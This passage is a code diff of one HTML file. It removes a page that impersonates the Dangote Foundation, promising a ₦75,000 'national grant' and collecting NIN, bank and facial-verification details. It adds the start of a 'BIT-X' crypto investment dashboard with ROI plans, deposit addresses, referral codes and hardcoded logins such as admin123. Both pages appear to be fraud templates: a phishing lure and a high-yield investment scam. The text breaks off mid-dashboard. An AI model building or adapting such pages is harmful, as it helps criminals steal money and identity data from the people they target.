@@ -1,285 +1,1380 @@
-<!DOCTYPE html>
+!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dangote National Empowerment Grant 2026</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
-    
-    <style>
-        body, html { 
-            margin: 0; padding: 0; height: 100%; width: 100%; 
-            overflow: hidden; font-family: 'Outfit', sans-serif; 
-        }
-        .serif { font-family: 'Playfair Display', serif; }
-        .bg-dangote { background-color: #003366; }
-        .text-dangote { color: #003366; }
-        
-        .hero-bg {
-            background: linear-gradient(rgba(0, 51, 102, 0.75), rgba(0, 51, 102, 0.9)), 
-                        url('https://i.imgur.com/iakAr92.jpeg');
-            background-size: cover; background-position: center;
-        }
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>BIT-X | Investment Platform</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+<style>
+  :root {
+    --blue: #1A56FF;
+    --blue-mid: #3A72FF;
+    --blue-light: #E8EEFF;
+    --blue-dark: #0A30CC;
+    --navy: #0B1437;
+    --white: #FFFFFF;
+    --offwhite: #F5F7FF;
+    --grey: #8A9BC0;
+    --grey-light: #EEF1F8;
+    --success: #10B981;
+    --danger: #EF4444;
+    --warning: #F59E0B;
+    --gold: #F5A623;
+    --text: #0B1437;
+    --text-soft: #5A6B8C;
+    --card-shadow: 0 4px 24px rgba(26,86,255,0.08);
+    --card-shadow-hover: 0 12px 40px rgba(26,86,255,0.16);
+    --radius: 16px;
+    --radius-sm: 10px;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'DM Sans',sans-serif; background:var(--offwhite); color:var(--text); min-height:100vh; }
 
-        .page-container {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            display: none; overflow-y: auto;
-        }
-        .page-container.active { display: block; }
-        .page-container.flex-center {
-            display: none; align-items: center; justify-content: center;
-        }
-        .page-container.flex-center.active { display: flex; }
-        
-        .loader {
-            border: 6px solid #f3f3f3; border-top: 6px solid #003366;
-            border-radius: 50%; width: 60px; height: 60px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  /* ─── PAGES ─── */
+  .page { display:none; }
+  .page.active { display:block; }
 
-        .card { background: white; width: 100%; max-width: 400px; padding: 2rem; border-radius: 1.5rem; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); margin: 1rem; position: relative; }
-    </style>
+  /* ─── AUTH PAGES ─── */
+  .auth-wrap {
+    min-height:100vh; display:flex; align-items:center; justify-content:center;
+    background: linear-gradient(135deg, #EEF2FF 0%, #E8EEFF 50%, #F0F4FF 100%);
+    padding:20px; position:relative; overflow:hidden;
+  }
+  .auth-wrap::before {
+    content:''; position:absolute; width:600px; height:600px;
+    background:radial-gradient(circle, rgba(26,86,255,0.08) 0%, transparent 70%);
+    top:-200px; right:-200px; pointer-events:none;
+  }
+  .auth-wrap::after {
+    content:''; position:absolute; width:400px; height:400px;
+    background:radial-gradient(circle, rgba(26,86,255,0.06) 0%, transparent 70%);
+    bottom:-100px; left:-100px; pointer-events:none;
+  }
+  .auth-card {
+    background:var(--white); border-radius:24px; padding:48px 40px;
+    width:100%; max-width:440px; box-shadow:0 20px 80px rgba(26,86,255,0.12);
+    position:relative; z-index:1; animation:fadeUp 0.5s ease;
+  }
+  .auth-logo { display:flex; align-items:center; gap:10px; margin-bottom:32px; }
+  .auth-logo-icon {
+    width:42px; height:42px; background:var(--blue); border-radius:12px;
+    display:flex; align-items:center; justify-content:center;
+    font-family:'Syne',sans-serif; font-weight:800; color:#fff; font-size:16px;
+  }
+  .auth-logo-text { font-family:'Syne',sans-serif; font-weight:800; font-size:22px; color:var(--navy); }
+  .auth-logo-text span { color:var(--blue); }
+  .auth-title { font-family:'Syne',sans-serif; font-weight:700; font-size:26px; color:var(--navy); margin-bottom:6px; }
+  .auth-sub { color:var(--text-soft); font-size:14px; margin-bottom:28px; }
+  .form-group { margin-bottom:18px; }
+  .form-group label { display:block; font-size:13px; font-weight:500; color:var(--text-soft); margin-bottom:7px; }
+  .form-group input, .form-group select {
+    width:100%; padding:13px 16px; border:1.5px solid var(--grey-light);
+    border-radius:var(--radius-sm); font-family:'DM Sans',sans-serif; font-size:14px;
+    color:var(--text); background:var(--offwhite); outline:none; transition:all .2s;
+  }
+  .form-group input:focus, .form-group select:focus {
+    border-color:var(--blue); background:#fff; box-shadow:0 0 0 3px rgba(26,86,255,0.08);
+  }
+  .btn-primary {
+    width:100%; padding:14px; background:var(--blue); color:#fff;
+    border:none; border-radius:var(--radius-sm); font-family:'Syne',sans-serif;
+    font-weight:700; font-size:15px; cursor:pointer; transition:all .2s; letter-spacing:.3px;
+  }
+  .btn-primary:hover { background:var(--blue-dark); transform:translateY(-1px); box-shadow:0 6px 20px rgba(26,86,255,0.3); }
+  .auth-switch { text-align:center; margin-top:20px; font-size:13px; color:var(--text-soft); }
+  .auth-switch a { color:var(--blue); font-weight:600; cursor:pointer; text-decoration:none; }
+  .auth-tabs { display:flex; gap:0; margin-bottom:24px; background:var(--grey-light); border-radius:10px; padding:4px; }
+  .auth-tab { flex:1; padding:9px; text-align:center; border-radius:7px; font-size:13px; font-weight:600; cursor:pointer; transition:all .2s; color:var(--text-soft); }
+  .auth-tab.active { background:#fff; color:var(--blue); box-shadow:0 2px 8px rgba(0,0,0,0.08); }
+
+  /* ─── MAIN APP LAYOUT ─── */
+  .app-layout { display:flex; min-height:100vh; }
+  .sidebar {
+    width:260px; background:var(--navy); position:fixed; top:0; left:0; bottom:0;
+    display:flex; flex-direction:column; z-index:100; transition:transform .3s;
+  }
+  .sidebar-logo {
+    padding:28px 24px 20px; display:flex; align-items:center; gap:10px;
+    border-bottom:1px solid rgba(255,255,255,0.07);
+  }
+  .sidebar-logo-icon {
+    width:38px; height:38px; background:var(--blue); border-radius:10px;
+    display:flex; align-items:center; justify-content:center;
+    font-family:'Syne',sans-serif; font-weight:800; color:#fff; font-size:14px; flex-shrink:0;
+  }
+  .sidebar-logo-text { font-family:'Syne',sans-serif; font-weight:800; font-size:20px; color:#fff; }
+  .sidebar-logo-text span { color:#60A5FA; }
+  .sidebar-nav { flex:1; padding:16px 12px; overflow-y:auto; }
+  .nav-label { font-size:10px; font-weight:700; text-transform:uppercase; letter-spacing:1.5px; color:rgba(255,255,255,0.3); padding:8px 12px 6px; margin-top:8px; }
+  .nav-item {
+    display:flex; align-items:center; gap:12px; padding:11px 14px; border-radius:10px;
+    color:rgba(255,255,255,0.55); font-size:14px; font-weight:500; cursor:pointer;
+    transition:all .2s; margin-bottom:2px;
+  }
+  .nav-item:hover { background:rgba(255,255,255,0.06); color:rgba(255,255,255,0.85); }
+  .nav-item.active { background:var(--blue); color:#fff; }
+  .nav-item svg { width:18px; height:18px; flex-shrink:0; }
+  .sidebar-user {
+    padding:16px; border-top:1px solid rgba(255,255,255,0.07);
+    display:flex; align-items:center; gap:12px;
+  }
+  .sidebar-avatar {
+    width:38px; height:38px; background:linear-gradient(135deg,#3A72FF,#1A56FF);
+    border-radius:50%; display:flex; align-items:center; justify-content:center;
+    font-weight:700; color:#fff; font-size:14px; flex-shrink:0;
+  }
+  .sidebar-user-info { flex:1; min-width:0; }
+  .sidebar-user-name { font-size:13px; font-weight:600; color:#fff; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+  .sidebar-user-role { font-size:11px; color:rgba(255,255,255,0.4); }
+  .logout-btn { background:none; border:none; color:rgba(255,255,255,0.4); cursor:pointer; padding:4px; transition:color .2s; }
+  .logout-btn:hover { color:var(--danger); }
+
+  /* ─── MAIN CONTENT ─── */
+  .main-content { margin-left:260px; flex:1; min-height:100vh; }
+  .topbar {
+    background:#fff; padding:16px 32px; display:flex; align-items:center;
+    justify-content:space-between; border-bottom:1px solid var(--grey-light);
+    position:sticky; top:0; z-index:50;
+  }
+  .topbar-title { font-family:'Syne',sans-serif; font-weight:700; font-size:20px; color:var(--navy); }
+  .topbar-right { display:flex; align-items:center; gap:16px; }
+  .topbar-badge {
+    background:var(--blue-light); color:var(--blue); font-size:12px; font-weight:600;
+    padding:5px 12px; border-radius:20px;
+  }
+  .content-area { padding:28px 32px; }
+
+  /* ─── CARDS ─── */
+  .card {
+    background:#fff; border-radius:var(--radius); padding:24px;
+    box-shadow:var(--card-shadow); transition:box-shadow .2s;
+  }
+  .card:hover { box-shadow:var(--card-shadow-hover); }
+
+  /* ─── STATS GRID ─── */
+  .stats-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:20px; margin-bottom:24px; }
+  .stat-card { background:#fff; border-radius:var(--radius); padding:22px; box-shadow:var(--card-shadow); position:relative; overflow:hidden; }
+  .stat-card::after {
+    content:''; position:absolute; width:80px; height:80px; border-radius:50%;
+    background:var(--blue-light); right:-20px; top:-20px; opacity:.6;
+  }
+  .stat-label { font-size:12px; font-weight:600; color:var(--text-soft); text-transform:uppercase; letter-spacing:.5px; margin-bottom:8px; }
+  .stat-value { font-family:'Syne',sans-serif; font-weight:800; font-size:26px; color:var(--navy); margin-bottom:6px; }
+  .stat-change { font-size:12px; font-weight:600; }
+  .stat-change.up { color:var(--success); }
+  .stat-change.down { color:var(--danger); }
+  .stat-icon {
+    position:absolute; right:20px; top:50%; transform:translateY(-50%);
+    width:44px; height:44px; background:var(--blue-light); border-radius:12px;
+    display:flex; align-items:center; justify-content:center; z-index:1;
+  }
+  .stat-icon svg { width:22px; height:22px; color:var(--blue); }
+
+  /* ─── TWO COL ─── */
+  .two-col { display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-bottom:24px; }
+  .three-col { display:grid; grid-template-columns:1.4fr 1fr; gap:20px; margin-bottom:24px; }
+
+  /* ─── PLAN CARDS ─── */
+  .plans-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:18px; margin-bottom:24px; }
+  .plan-card {
+    background:#fff; border-radius:var(--radius); padding:26px 20px;
+    box-shadow:var(--card-shadow); border:2px solid transparent;
+    transition:all .25s; cursor:pointer; position:relative; overflow:hidden;
+  }
+  .plan-card:hover { border-color:var(--blue); transform:translateY(-4px); box-shadow:var(--card-shadow-hover); }
+  .plan-card.popular { border-color:var(--blue); }
+  .plan-badge {
+    position:absolute; top:14px; right:14px; background:var(--blue); color:#fff;
+    font-size:10px; font-weight:700; padding:3px 8px; border-radius:20px; text-transform:uppercase; letter-spacing:.5px;
+  }
+  .plan-name { font-family:'Syne',sans-serif; font-weight:800; font-size:17px; color:var(--navy); margin-bottom:6px; }
+  .plan-roi {
+    font-family:'Syne',sans-serif; font-weight:800; font-size:32px; color:var(--blue); margin-bottom:4px;
+  }
+  .plan-roi span { font-size:14px; font-weight:500; color:var(--text-soft); }
+  .plan-min { font-size:13px; color:var(--text-soft); margin-bottom:16px; }
+  .plan-features { list-style:none; margin-bottom:20px; }
+  .plan-features li { font-size:13px; color:var(--text-soft); padding:5px 0; display:flex; align-items:center; gap:8px; }
+  .plan-features li::before { content:'✓'; color:var(--success); font-weight:700; font-size:12px; }
+  .btn-plan {
+    width:100%; padding:11px; border-radius:var(--radius-sm);
+    border:2px solid var(--blue); background:transparent; color:var(--blue);
+    font-family:'Syne',sans-serif; font-weight:700; font-size:13px; cursor:pointer; transition:all .2s;
+  }
+  .btn-plan:hover, .plan-card.popular .btn-plan { background:var(--blue); color:#fff; }
+
+  /* ─── TABLE ─── */
+  .table-wrap { overflow-x:auto; }
+  table { width:100%; border-collapse:collapse; }
+  th { font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:.7px; color:var(--text-soft); padding:10px 16px; text-align:left; border-bottom:2px solid var(--grey-light); }
+  td { padding:13px 16px; font-size:13.5px; border-bottom:1px solid var(--grey-light); color:var(--text); }
+  tr:last-child td { border-bottom:none; }
+  tr:hover td { background:var(--offwhite); }
+  .badge {
+    display:inline-block; padding:3px 10px; border-radius:20px; font-size:11px; font-weight:700;
+  }
+  .badge-success { background:#D1FAE5; color:#065F46; }
+  .badge-warning { background:#FEF3C7; color:#92400E; }
+  .badge-danger { background:#FEE2E2; color:#991B1B; }
+  .badge-blue { background:var(--blue-light); color:var(--blue); }
+
+  /* ─── ROI CALCULATOR ─── */
+  .calc-wrap { display:grid; grid-template-columns:1fr 1fr; gap:28px; align-items:start; }
+  .calc-result-box {
+    background:var(--navy); border-radius:var(--radius); padding:28px;
+    color:#fff; text-align:center;
+  }
+  .calc-result-label { font-size:12px; color:rgba(255,255,255,0.5); text-transform:uppercase; letter-spacing:1px; margin-bottom:8px; }
+  .calc-result-value { font-family:'Syne',sans-serif; font-weight:800; font-size:42px; color:#60A5FA; margin-bottom:4px; }
+  .calc-result-total { font-size:14px; color:rgba(255,255,255,0.6); margin-bottom:20px; }
+  .calc-breakdown { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:16px; }
+  .calc-breakdown-item { background:rgba(255,255,255,0.06); border-radius:10px; padding:14px; }
+  .calc-breakdown-item .label { font-size:11px; color:rgba(255,255,255,0.45); margin-bottom:4px; }
+  .calc-breakdown-item .val { font-family:'Syne',sans-serif; font-weight:700; font-size:18px; color:#fff; }
+  .range-input { -webkit-appearance:none; width:100%; height:6px; border-radius:3px; background:var(--grey-light); outline:none; margin:8px 0; }
+  .range-input::-webkit-slider-thumb {
+    -webkit-appearance:none; width:20px; height:20px; border-radius:50%;
+    background:var(--blue); cursor:pointer; box-shadow:0 2px 8px rgba(26,86,255,0.4);
+  }
+
+  /* ─── DEPOSIT/WITHDRAW ─── */
+  .dw-tabs { display:flex; gap:0; margin-bottom:24px; border-bottom:2px solid var(--grey-light); }
+  .dw-tab { padding:12px 24px; font-weight:600; font-size:14px; cursor:pointer; color:var(--text-soft); border-bottom:2px solid transparent; margin-bottom:-2px; transition:all .2s; }
+  .dw-tab.active { color:var(--blue); border-bottom-color:var(--blue); }
+  .crypto-address {
+    background:var(--offwhite); border:1.5px solid var(--grey-light); border-radius:var(--radius-sm);
+    padding:14px 16px; font-family:monospace; font-size:13px; color:var(--text); word-break:break-all;
+    display:flex; align-items:center; justify-content:space-between; gap:12px; margin-top:8px;
+  }
+  .copy-btn {
+    background:var(--blue); color:#fff; border:none; border-radius:7px;
+    padding:7px 14px; font-size:12px; font-weight:700; cursor:pointer; white-space:nowrap;
+    font-family:'DM Sans',sans-serif; transition:background .2s;
+  }
+  .copy-btn:hover { background:var(--blue-dark); }
+  .qr-placeholder {
+    width:140px; height:140px; background:var(--grey-light); border-radius:12px;
+    display:flex; align-items:center; justify-content:center; color:var(--grey);
+    font-size:11px; font-weight:600; margin:16px auto; text-align:center; flex-direction:column; gap:6px;
+  }
+  .network-badge { display:inline-block; background:var(--blue-light); color:var(--blue); font-size:11px; font-weight:700; padding:3px 10px; border-radius:20px; margin-top:4px; }
+
+  /* ─── CHART BARS ─── */
+  .mini-chart { display:flex; align-items:flex-end; gap:6px; height:80px; padding-top:8px; }
+  .bar-wrap { flex:1; display:flex; flex-direction:column; align-items:center; gap:4px; }
+  .bar { width:100%; background:var(--blue-light); border-radius:4px 4px 0 0; transition:height .4s ease; }
+  .bar.active { background:var(--blue); }
+  .bar-label { font-size:10px; color:var(--text-soft); }
+
+  /* ─── ACTIVITY LIST ─── */
+  .activity-list { display:flex; flex-direction:column; gap:0; }
+  .activity-item { display:flex; align-items:center; gap:14px; padding:14px 0; border-bottom:1px solid var(--grey-light); }
+  .activity-item:last-child { border-bottom:none; }
+  .activity-icon { width:38px; height:38px; border-radius:11px; display:flex; align-items:center; justify-content:center; flex-shrink:0; font-size:16px; }
+  .activity-icon.in { background:#D1FAE5; }
+  .activity-icon.out { background:#FEE2E2; }
+  .activity-icon.roi { background:var(--blue-light); }
+  .activity-info { flex:1; }
+  .activity-title { font-size:13.5px; font-weight:600; color:var(--navy); }
+  .activity-time { font-size:11px; color:var(--grey); margin-top:2px; }
+  .activity-amount { font-family:'Syne',sans-serif; font-weight:700; font-size:14px; }
+  .activity-amount.up { color:var(--success); }
+  .activity-amount.down { color:var(--danger); }
+
+  /* ─── SECTION HEADER ─── */
+  .section-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:18px; }
+  .section-title { font-family:'Syne',sans-serif; font-weight:700; font-size:17px; color:var(--navy); }
+  .section-action { font-size:13px; color:var(--blue); font-weight:600; cursor:pointer; }
+
+  /* ─── ADMIN ─── */
+  .admin-stats { display:grid; grid-template-columns:repeat(4,1fr); gap:16px; margin-bottom:24px; }
+
+  /* ─── MODAL ─── */
+  .modal-overlay {
+    display:none; position:fixed; inset:0; background:rgba(11,20,55,0.5);
+    backdrop-filter:blur(4px); z-index:1000; align-items:center; justify-content:center;
+  }
+  .modal-overlay.open { display:flex; }
+  .modal { background:#fff; border-radius:20px; padding:36px; max-width:480px; width:90%; animation:fadeUp .3s ease; }
+  .modal-title { font-family:'Syne',sans-serif; font-weight:800; font-size:20px; color:var(--navy); margin-bottom:6px; }
+  .modal-sub { font-size:13px; color:var(--text-soft); margin-bottom:24px; }
+  .modal-actions { display:flex; gap:12px; margin-top:24px; }
+  .btn-outline { flex:1; padding:12px; border:2px solid var(--grey-light); border-radius:var(--radius-sm); background:transparent; color:var(--text-soft); font-family:'DM Sans',sans-serif; font-weight:600; font-size:14px; cursor:pointer; }
+  .btn-confirm { flex:1; padding:12px; background:var(--blue); color:#fff; border:none; border-radius:var(--radius-sm); font-family:'Syne',sans-serif; font-weight:700; font-size:14px; cursor:pointer; }
+
+  /* ─── TOAST ─── */
+  .toast {
+    position:fixed; bottom:28px; right:28px; background:var(--navy); color:#fff;
+    padding:14px 22px; border-radius:12px; font-size:14px; font-weight:500;
+    box-shadow:0 8px 32px rgba(0,0,0,0.2); z-index:2000;
+    transform:translateY(80px); opacity:0; transition:all .3s;
+  }
+  .toast.show { transform:translateY(0); opacity:1; }
+  .toast.success { background:var(--success); }
+  .toast.error { background:var(--danger); }
+
+  /* ─── ANIMATIONS ─── */
+  @keyframes fadeUp {
+    from { opacity:0; transform:translateY(20px); }
+    to { opacity:1; transform:translateY(0); }
+  }
+  .fade-in { animation:fadeUp .4s ease; }
+
+  /* ─── PROFILE ─── */
+  .profile-header {
+    background:linear-gradient(135deg, var(--navy) 0%, #1A2F6A 100%);
+    border-radius:var(--radius); padding:32px; color:#fff; margin-bottom:20px;
+    display:flex; align-items:center; gap:24px;
+  }
+  .profile-avatar-lg {
+    width:72px; height:72px; border-radius:50%;
+    background:linear-gradient(135deg,#3A72FF,#60A5FA);
+    display:flex; align-items:center; justify-content:center;
+    font-family:'Syne',sans-serif; font-weight:800; font-size:28px; color:#fff; flex-shrink:0;
+  }
+  .profile-name { font-family:'Syne',sans-serif; font-weight:800; font-size:22px; margin-bottom:4px; }
+  .profile-email { font-size:13px; color:rgba(255,255,255,0.6); margin-bottom:8px; }
+  .verified-badge { display:inline-flex; align-items:center; gap:5px; background:rgba(16,185,129,0.2); color:#6EE7B7; font-size:11px; font-weight:700; padding:3px 10px; border-radius:20px; }
+
+  /* ─── EMPTY ─── */
+  .empty-state { text-align:center; padding:40px 20px; color:var(--text-soft); }
+  .empty-state svg { width:48px; height:48px; margin:0 auto 12px; opacity:.3; }
+  .empty-state p { font-size:14px; }
+
+  /* ─── RESPONSIVE ─── */
+  @media(max-width:900px) {
+    .sidebar { transform:translateX(-260px); }
+    .sidebar.open { transform:translateX(0); }
+    .main-content { margin-left:0; }
+    .stats-grid, .plans-grid, .admin-stats { grid-template-columns:1fr 1fr; }
+    .two-col, .three-col, .calc-wrap { grid-template-columns:1fr; }
+    .content-area { padding:20px 16px; }
+  }
+  @media(max-width:500px) {
+    .stats-grid, .plans-grid, .admin-stats { grid-template-columns:1fr; }
+  }
+  .menu-toggle {
+    display:none; background:none; border:none; cursor:pointer; padding:4px;
+    color:var(--navy);
+  }
+  @media(max-width:900px) { .menu-toggle { display:block; } }
+  .overlay-bg { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.4); z-index:99; }
+  .overlay-bg.show { display:block; }
+</style>
 </head>
-<body class="bg-gray-50">
+<body>
 
-    <!-- PAGE 1: LANDING PAGE -->
-    <div id="landingPage" class="page-container active">
-        <nav class="bg-white py-4 px-6 border-b flex justify-between items-center sticky top-0 z-50">
-            <div class="flex items-center gap-2">
-                <div class="w-10 h-10 bg-dangote rounded flex items-center justify-center text-white font-bold text-xl">D</div>
-                <span class="font-extrabold tracking-tighter text-xl text-dangote">DANGOTE <span class="text-gray-400 font-light">FOUNDATION</span></span>
-            </div>
-        </nav>
-        <header class="hero-bg min-h-[80vh] flex items-center justify-center text-center text-white px-6">
-            <div class="max-w-4xl">
-                <div class="inline-block bg-yellow-500 text-dangote px-4 py-1 rounded-full text-xs font-black mb-6 uppercase">Official 2026 Disbursement</div>
-                <h1 class="serif text-5xl md:text-7xl mb-6 leading-tight">National Grant of ₦75,000 for All Citizens.</h1>
-                <p class="text-lg md:text-xl font-light mb-10 text-gray-100 max-w-2xl mx-auto leading-relaxed">Aliko Dangote is empowering Nigerians aged 18 and above with a ₦75,000 relief grant. Apply now to receive your direct cash transfer.</p>
-                <button onclick="navigateTo('step1')" class="bg-white text-dangote px-12 py-5 rounded-xl font-black uppercase tracking-widest hover:bg-yellow-500 hover:text-white transition-all shadow-2xl">Apply for Grant</button>
-            </div>
-        </header>
-        <section class="py-24 px-6 max-w-6xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-12 bg-white">
-            <div class="text-center">
-                <div class="text-4xl mb-4">🇳🇬</div>
-                <h3 class="font-bold text-xl mb-2 text-dangote uppercase">Eligibility</h3>
-                <p class="text-gray-500 text-sm">Must be a Nigerian citizen with a valid National Identity Number (NIN) and 18+ years of age.</p>
-            </div>
-            <div class="text-center">
-                <div class="text-4xl mb-4">💳</div>
-                <h3 class="font-bold text-xl mb-2 text-dangote uppercase">Verification</h3>
-                <p class="text-gray-500 text-sm">Automated banking validation and facial verification required for instant approval.</p>
-            </div>
-            <div class="text-center">
-                <div class="text-4xl mb-4">⚡</div>
-                <h3 class="font-bold text-xl mb-2 text-dangote uppercase">Instant Pay</h3>
-                <p class="text-gray-500 text-sm">Approved funds are disbursed directly into your provided bank account within 24 hours.</p>
-            </div>
-        </section>
-        <footer class="py-12 text-center text-gray-400 text-[10px] tracking-widest uppercase border-t">© 2026 Dangote Philanthropy Division.</footer>
+<!-- ══════════════════════════════════ AUTH PAGES ══════════════════════════════════ -->
+
+<!-- LOGIN PAGE -->
+<div id="page-login" class="page active">
+  <div class="auth-wrap">
+    <div class="auth-card">
+      <div class="auth-logo">
+        <div class="auth-logo-icon">BX</div>
+        <div class="auth-logo-text">BIT<span>-X</span></div>
+      </div>
+      <div class="auth-tabs">
+        <div class="auth-tab active" onclick="switchAuthTab('login')">Sign In</div>
+        <div class="auth-tab" onclick="switchAuthTab('register')">Create Account</div>
+      </div>
+      <div id="login-form">
+        <div class="auth-title">Welcome back 👋</div>
+        <div class="auth-sub">Sign in to access your investment dashboard</div>
+        <div class="form-group">
+          <label>Email Address</label>
+          <input type="email" id="login-email" placeholder="you@example.com" value="user@bitx.com"/>
+        </div>
+        <div class="form-group">
+          <label>Password</label>
+          <input type="password" id="login-pass" placeholder="••••••••" value="password123"/>
+        </div>
+        <button class="btn-primary" onclick="doLogin()">Sign In to BIT-X</button>
+        <div class="auth-switch">Admin? <a onclick="showAdminLogin()">Sign in as Admin</a></div>
+      </div>
+      <div id="register-form" style="display:none">
+        <div class="auth-title">Create Account</div>
+        <div class="auth-sub">Join BIT-X and start earning today</div>
+        <div class="form-group"><label>Full Name</label><input type="text" id="reg-name" placeholder="John Doe"/></div>
+        <div class="form-group"><label>Email Address</label><input type="email" id="reg-email" placeholder="you@example.com"/></div>
+        <div class="form-group"><label>Password</label><input type="password" id="reg-pass" placeholder="Min 8 characters"/></div>
+        <div class="form-group"><label>Referral Code (optional)</label><input type="text" placeholder="e.g. BX12345"/></div>
+        <button class="btn-primary" onclick="doRegister()">Create My Account</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ADMIN LOGIN -->
+<div id="page-admin-login" class="page">
+  <div class="auth-wrap">
+    <div class="auth-card">
+      <div class="auth-logo">
+        <div class="auth-logo-icon" style="background:#0B1437;">⚙</div>
+        <div class="auth-logo-text">BIT<span>-X</span> Admin</div>
+      </div>
+      <div class="auth-title">Admin Portal</div>
+      <div class="auth-sub">Restricted access — authorized personnel only</div>
+      <div class="form-group"><label>Admin Email</label><input type="email" id="admin-email" placeholder="admin@bitx.com" value="admin@bitx.com"/></div>
+      <div class="form-group"><label>Admin Password</label><input type="password" id="admin-pass" placeholder="••••••••" value="admin123"/></div>
+      <button class="btn-primary" style="background:var(--navy);" onclick="doAdminLogin()">Access Admin Panel</button>
+      <div class="auth-switch"><a onclick="showPage('page-login')">← Back to user login</a></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════ USER DASHBOARD ══════════════════════════════════ -->
+<div id="page-dashboard" class="page">
+  <div class="overlay-bg" id="sidebar-overlay" onclick="closeSidebar()"></div>
+  <div class="app-layout">
+    <!-- SIDEBAR -->
+    <div class="sidebar" id="main-sidebar">
+      <div class="sidebar-logo">
+        <div class="sidebar-logo-icon">BX</div>
+        <div class="sidebar-logo-text">BIT<span>-X</span></div>
+      </div>
+      <div class="sidebar-nav">
+        <div class="nav-label">Main</div>
+        <div class="nav-item active" onclick="switchTab('home')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9,22 9,12 15,12 15,22"/></svg>
+          Dashboard
+        </div>
+        <div class="nav-item" onclick="switchTab('plans')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+          Investment Plans
+        </div>
+        <div class="nav-item" onclick="switchTab('calculator')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="2" width="16" height="20" rx="2"/><line x1="8" y1="6" x2="16" y2="6"/><line x1="8" y1="10" x2="16" y2="10"/><line x1="8" y1="14" x2="12" y2="14"/></svg>
+          ROI Calculator
+        </div>
+        <div class="nav-label">Finance</div>
+        <div class="nav-item" onclick="switchTab('deposit')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>
+          Deposit & Withdraw
+        </div>
+        <div class="nav-item" onclick="switchTab('history')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          Transactions
+        </div>
+        <div class="nav-label">Account</div>
+        <div class="nav-item" onclick="switchTab('profile')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+          Profile
+        </div>
+      </div>
+      <div class="sidebar-user">
+        <div class="sidebar-avatar" id="user-avatar-init">JD</div>
+        <div class="sidebar-user-info">
+          <div class="sidebar-user-name" id="user-sidebar-name">John Doe</div>
+          <div class="sidebar-user-role">Investor</div>
+        </div>
+        <button class="logout-btn" onclick="doLogout()" title="Logout">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+        </button>
+      </div>
     </div>
 
-    <!-- PAGE 2: BANKING FORM -->
-    <div id="step1" class="page-container flex-center bg-slate-900">
-        <div class="card relative">
-            <button onclick="navigateTo('landingPage')" class="absolute top-4 left-6 text-gray-400 hover:text-dangote text-xs font-bold">← BACK</button>
-            <div class="mt-6 mb-6 text-center">
-                <h2 class="serif text-3xl text-dangote font-bold">Personal & Bank</h2>
-                <p class="text-gray-400 text-xs font-bold mt-1 uppercase">Step 1: Information Entry</p>
+    <!-- MAIN -->
+    <div class="main-content">
+      <div class="topbar">
+        <div style="display:flex;align-items:center;gap:12px;">
+          <button class="menu-toggle" onclick="toggleSidebar()">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+          </button>
+          <div class="topbar-title" id="topbar-title">Dashboard</div>
+        </div>
+        <div class="topbar-right">
+          <div class="topbar-badge" id="user-plan-badge">Basic Plan</div>
+          <div style="width:36px;height:36px;background:var(--blue-light);border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;color:var(--blue);font-size:13px;" id="topbar-avatar">JD</div>
+        </div>
+      </div>
+
+      <div class="content-area">
+
+        <!-- HOME TAB -->
+        <div id="tab-home" class="fade-in">
+          <div class="stats-grid">
+            <div class="stat-card">
+              <div class="stat-label">Total Balance</div>
